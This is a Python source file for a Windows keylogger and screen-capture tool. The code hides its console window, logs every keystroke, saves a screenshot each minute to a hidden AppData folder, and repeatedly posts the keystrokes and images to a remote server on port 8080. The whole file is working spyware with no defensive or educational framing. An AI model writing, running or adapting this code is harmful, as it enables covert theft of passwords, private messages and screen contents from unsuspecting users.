import win32gui
import win32console
from pynput import keyboard
import requests
import json
import threading
import pyautogui
import os

def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

Hide()

path = os.path.expanduser("~\\AppData\\Local\\Logger")
os.makedirs(path, exist_ok=True)

text = ""

try:
    with open("ip_address.txt", "r") as file:
        ip_address = file.read().strip()
except Exception:
    print("Could not read ip_address.txt")
    ip_address = None

port_number = "8080"
time_interval = 10
screenshot_interval = 60

def capture_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        filename = os.path.join(path, "screenshot.png")
        screenshot.save(filename)
        with open(filename, "rb") as img:
            requests.post(f"http://{ip_address}:{port_number}/screenshot", files={"file": img})
    except Exception as e:
        return None

def schedule_screenshot():
    capture_and_send_screenshot()
    threading.Timer(screenshot_interval, schedule_screenshot).start()

def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData": text})
        requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        text = ""
    except Exception as e:
        return None
    threading.Timer(time_interval, send_post_req).start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1] if text else text
        elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip("'")
    except Exception as e:
        return None

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    schedule_screenshot()
    listener.join()
